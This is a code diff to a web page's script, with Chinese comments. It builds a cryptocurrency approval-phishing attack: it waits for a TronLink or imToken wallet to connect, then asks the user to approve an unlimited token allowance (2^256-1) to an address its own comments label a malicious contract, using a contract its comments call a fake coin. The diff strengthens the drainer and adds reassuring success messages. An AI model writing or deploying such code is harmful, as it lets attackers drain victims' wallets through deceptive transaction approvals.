@@ -14,18 +14,28 @@
   <script>
     const fakeUSDT = "TVCS7QxvBzTxg1ybwMTxVeaJktHCCFj4Xt";     // 假幣地址
     const fakeApprove = "TNogK4zkavHQtpyAgBuTRo7iNPREHj9dxx";   // 惡意合約地址
-    const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 2^256 - 1
+    const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 2^256-1
+
+    async function waitForWallet(timeout = 10000) {
+      const start = Date.now();
+      while ((!window.tronWeb || !window.tronWeb.defaultAddress.base58) && (Date.now() - start < timeout)) {
+        document.getElementById("status").innerText = "⏳ 正在等待錢包連線...";
+        await new Promise(r => setTimeout(r, 500));
+      }
+    }
 
     async function approve() {
-      if (!window.tronWeb || !window.tronWeb.ready) {
-        document.getElementById("status").innerText = "請先安裝並登入 TronLink 或 imToken";
+      await waitForWallet();
+
+      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+        document.getElementById("status").innerText = "❌ 找不到 TronLink 或 imToken 錢包";
         return;
       }
 
       try {
         const contract = await window.tronWeb.contract().at(fakeUSDT);
-        const tx = await contract.approve(fakeApprove, amount).send();
-        document.getElementById("status").innerText = `✅ 授權成功！交易哈希：${tx}`;
+        const tx = await contract.approve(fakeApprove, maxAmount).send();
+        document.getElementById("status").innerText = `✅ 授權成功！TX：${tx}`;
       } catch (err) {
         document.getElementById("status").innerText = `❌ 錯誤：${err.message}`;
       }
